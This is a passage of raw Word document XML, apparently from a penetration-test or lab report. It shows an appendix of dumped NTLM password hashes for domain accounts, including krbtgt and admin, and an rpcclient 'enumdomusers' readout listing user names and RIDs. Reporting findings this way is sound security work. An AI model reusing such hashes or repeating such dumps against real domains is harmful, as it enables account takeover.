      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00851413">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>krbtgt:</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00851413">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>502:aad</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00851413">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>3b435b51404eeaad3b435b51404ee:c64f1cd2a8a15ced225f7192d362963b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62794734" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="720" w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00851413">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>admin:1000:aad3b435b51404eeaad3b435b51404ee:a492077fbcde819c130f5383f76d0e9c</w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">R.Astley:1110:aad3b435b51404eeaad3b435b51404ee:bde1966c31599bfafd3fea25f7f15ea2 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">enable$:1111:aad3b435b51404eeaad3b435b51404ee:dc72ccd108cf42f91b9d4c759b6884d0 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">as400$:1112:aad3b435b51404eeaad3b435b51404ee:9b33a9affa2a896de7aaa2390eeb7556 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">1$:1113:aad3b435b51404eeaad3b435b51404ee:bc43f286eddab29367781ec0d5939540 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">media$:1114:aad3b435b51404eeaad3b435b51404ee:54e0945169ba832abcd6fec9cafa2045 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">homerun$:1115:aad3b435b51404eeaad3b435b51404ee:bca1bc40c5fde2a6f46cd26588635180 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">pc36$:1116:aad3b435b51404eeaad3b435b51404ee:586041f59054b7a1db1e03df076ede2f [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">clusters$:1117:aad3b435b51404eeaad3b435b51404ee:869d73dc90e13f4b1a2e97a3be5dfb85 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">montana$:1118:aad3b435b51404eeaad3b435b51404ee:1c2f544568e6a85deff96e6217ba6ee2 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">illinois$:1119:aad3b435b51404eeaad3b435b51404ee:9847a2815ebc6c3477a80c948ce702b1 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">ows$:1120:aad3b435b51404eeaad3b435b51404ee:9a6c2ae998c83cd8243a2c06446f0c6c [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">cork$:1121:aad3b435b51404eeaad3b435b51404ee:771dab1de5b7182417a026a4a195353e [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">tsinghua$:1122:aad3b435b51404eeaad3b435b51404ee:845f2149278232798ebb9e61283bd48c [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">lnk$:1123:aad3b435b51404eeaad3b435b51404ee:25350c61568665c82e0fd1dd77a76f7f [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">lsan03$:1124:aad3b435b51404eeaad3b435b51404ee:00e9df5a59e03ea06500cf3743db84bd [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">neo$:1125:aad3b435b51404eeaad3b435b51404ee:a9cd1d70fba3881718678cedc1b4b225 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">nebraska$:1126:aad3b435b51404eeaad3b435b51404ee:a0addd27aab9abf621901cfdd541aac5 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">mailgate$:1127:aad3b435b51404eeaad3b435b51404ee:97bdf70d015592f7697fd75de4b43457 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">unitedstates$:1128:aad3b435b51404eeaad3b435b51404ee:e543053e90c5d9fa11c84a62be51c887 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">hstntx$:1129:aad3b435b51404eeaad3b435b51404ee:624255ca01363ddc09702c0b4a098ff4 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">rtr1$:1130:aad3b435b51404eeaad3b435b51404ee:ac113b18ddec57cbf3ea6f0d130f5eaa [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">scanner$:1131:aad3b435b51404eeaad3b435b51404ee:e079d99d9c2d52a39eec536eca1a0533 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">ok$:1132:aad3b435b51404eeaad3b435b51404ee:bec52b70f8d6d2665c8573197f67e9ad [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">northeast$:1133:aad3b435b51404eeaad3b435b51404ee:45603182d6b3338bcf90f2a0194ac116 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">americas$:1134:aad3b435b51404eeaad3b435b51404ee:c33bcd640021509f1b548d4a38b16bde [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">rw$:1135:aad3b435b51404eeaad3b435b51404ee:84f25fdfed7c0f323cde189c7edb4abb [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">SERVER2$:1137:aad3b435b51404eeaad3b435b51404ee:97242961b1c6d2e056f8a529ad0b9365 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">CLIENT1$:1138:aad3b435b51404eeaad3b435b51404ee:16c8f397355d1d0db303011edaf55978 [+] </w:t>
      </w:r>
      <w:r w:rsidRPr="00D43770">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">CLIENT2$:1602:aad3b435b51404eeaad3b435b51404ee:0831bffa4dfc9640305208223e89eb4b [*] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AD830F" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="720" w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5889C93D" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Appendix g – rpcclient readouts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FA0D7D" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>rpcclient $&gt; enumdomusers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE45690" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Administrator] rid:[0x1f4]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D9D091" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Guest] rid:[0x1f5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C232711" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>krbtgt] rid:[0x1f6]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9E693A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>admin] rid:[0x3e8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4737BCCC" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>R.Astley] rid:[0x456]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4052B913" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C.Moreno] rid:[0x473]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4092D502" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C.Griffin] rid:[0x474]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C029606" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>I.Pratt] rid:[0x475]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A425E63" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>L.Burke] rid:[0x476]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2BDF9F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Johnson] rid:[0x477]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212EA091" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>T.Nunez] rid:[0x478]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D2B14C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Stevenson] rid:[0x479]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E8632F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>L.Thornton] rid:[0x47a]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B31F336" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>M.Day] rid:[0x47b]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464C699C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C.Morris] rid:[0x47c]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7C5D69" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>R.Knight] rid:[0x47d]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1879E2" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>P.Pittman] rid:[0x47e]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2808ACF1" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>D.King] rid:[0x47f]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDF6B38" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>D.Dunn] rid:[0x480]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69214318" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>D.Manning] rid:[0x481]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C17E462" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>D.Valdez] rid:[0x482]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA15652" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>D.Price] rid:[0x483]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77797601" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Saunders] rid:[0x484]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B10C10" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Hart] rid:[0x485]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6828737D" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>S.Reed] rid:[0x486]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E36CA8" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
